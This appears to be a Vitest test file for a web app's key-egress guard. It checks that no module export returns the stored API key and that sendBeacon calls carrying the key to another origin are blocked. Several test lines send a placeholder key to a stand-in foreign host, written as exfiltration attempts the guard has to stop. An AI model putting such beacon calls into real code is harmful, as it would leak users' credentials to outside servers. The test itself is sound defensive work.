/**
 * astra A03c F1 (round 3): the one-reader key boundary has to hold at run
 * time, not only in textual patterns.
 * - No export of the modules that hold or send the key may return it.
 * - A key-carrying sendBeacon to another origin is refused, like fetch.
 *
 * @vitest-environment jsdom
 */

import { afterEach, describe, expect, it, vi } from "vitest";
import * as store from "../../stores/auth-store.js";
import * as keyModule from "../authorized-fetch.js";

const KEY = "pcc_test_r4boundary0123456789abcdef";

afterEach(() => {
  store.adoptApiKey(null);
  vi.restoreAllMocks();
});

describe("no export hands out the stored key (A03c F1, reproduction A)", () => {
  it("no zero-argument export of the store or of the key module returns the signed-in key", () => {
    store.adoptApiKey(KEY);
    const leaks = [...Object.entries(store), ...Object.entries(keyModule)]
      // Hooks and installers are not getters: calling them has effects of their own.
      .filter(([name, v]) => typeof v === "function" && (v as () => unknown).length === 0 && !/^(use|install)/.test(name))
      .filter(([, v]) => {
        try {
          return (v as () => unknown)() === KEY;
        } catch {
          return false;
        }
      })
      .map(([name]) => name);
    expect(leaks).toEqual([]);
  });
});

describe("sendBeacon is under the egress guard (A03c F1, reproduction B)", () => {
  function withBeacon() {
    const beacon = vi.fn((_url: string | URL, _data?: BodyInit | null) => true);
    Object.defineProperty(navigator, "sendBeacon", { value: beacon, configurable: true, writable: true });
    return beacon;
  }

  it("refuses a beacon carrying the key to another origin, whatever the body type", () => {
    const beacon = withBeacon();
    store.adoptApiKey(KEY);
    const uninstall = keyModule.installGatewayKeyGuard();
    try {
      vi.spyOn(console, "error").mockImplementation(() => {});
      expect(navigator.sendBeacon("https://foreign.example/collect", KEY)).toBe(false);
      expect(navigator.sendBeacon("https://foreign.example/collect", new URLSearchParams({ key: KEY }))).toBe(false);
      expect(navigator.sendBeacon(`https://foreign.example/collect?k=${KEY}`)).toBe(false);
      expect(navigator.sendBeacon("https://foreign.example/collect", new TextEncoder().encode(KEY))).toBe(false);
      expect(beacon).not.toHaveBeenCalled();
    } finally {
      uninstall();
    }
  });

  it("lets keyless beacons and beacons to the gateway through", () => {
    const beacon = withBeacon();
    store.adoptApiKey(KEY);
    const uninstall = keyModule.installGatewayKeyGuard();
    try {
      expect(navigator.sendBeacon("https://foreign.example/collect", '{"event":"pageleave"}')).toBe(true);
      expect(navigator.sendBeacon("/api/telemetry/beacon", KEY)).toBe(true);
      expect(beacon).toHaveBeenCalledTimes(2);
    } finally {
      uninstall();
    }
  });
});
